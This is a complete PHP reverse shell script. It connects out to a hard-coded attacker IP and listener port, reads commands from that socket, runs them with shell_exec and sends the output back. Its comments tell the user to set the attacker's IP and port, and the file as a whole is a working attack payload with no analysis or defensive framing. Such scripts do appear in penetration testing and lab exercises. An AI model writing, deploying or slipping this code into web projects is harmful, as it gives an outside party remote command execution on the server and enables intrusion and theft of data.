<?php
$ip = '192.168.92.204';  // Change this to your attacker's IP
$port = 4444;           // Change this to your listener port

$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($sock, $ip, $port);

while (true) {
    $cmd = socket_read($sock, 1024);
    if ($cmd == "exit\n") {
        break;
    }
    $output = shell_exec($cmd);
    socket_write($sock, $output, strlen($output));
}

socket_close($sock);
?>
